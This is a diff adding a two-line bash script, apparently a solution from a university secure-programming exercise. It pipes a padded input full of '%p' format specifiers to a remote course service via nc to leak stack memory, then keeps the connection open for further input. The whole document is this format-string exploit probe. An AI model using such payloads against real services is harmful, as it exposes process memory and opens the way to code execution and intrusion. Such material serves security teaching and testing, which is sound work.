@@ -1,0 +1,2 @@
+#!/bin/bash
+(python -c 'print "12345678901234567890123456789012345678 /echo:ABCD%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"' && cat ) | nc 'secprog.cs.nctu.edu.tw' 10032
